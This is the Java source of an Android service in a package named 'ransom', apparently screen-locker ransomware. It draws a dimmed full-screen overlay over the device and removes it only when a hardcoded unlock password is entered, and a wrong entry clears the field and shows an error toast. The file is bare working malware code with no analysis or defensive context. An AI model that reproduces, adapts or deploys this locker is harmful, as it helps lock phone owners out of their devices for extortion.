package com.sk.ransom;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.Toast;

// Import
import com.google.android.material.button.MaterialButton;

// Logic
public class A extends Service {
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onCreate() {
        super.onCreate();
        final WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_DIM_BEHIND | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.CENTER;
        params.dimAmount = 0.7f; 

        final View inflate = LayoutInflater.from(this).inflate(R.layout.main, null);
        wm.addView(inflate, params);

        final MaterialButton btn = (MaterialButton) inflate.findViewById(R.id.materialbutton1); 
        final EditText et = (EditText) inflate.findViewById(R.id.edittext1); 

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(et.getText().toString().equals("AURBgHbLoxJl5Ld7WTng")) {
                    wm.removeView(inflate);
                    stopSelf();
                } else {
                    Toast.makeText(A.this, "Password ‚ùå", Toast.LENGTH_SHORT).show();
                    et.setText("");
                }
            }
        });
    }
}
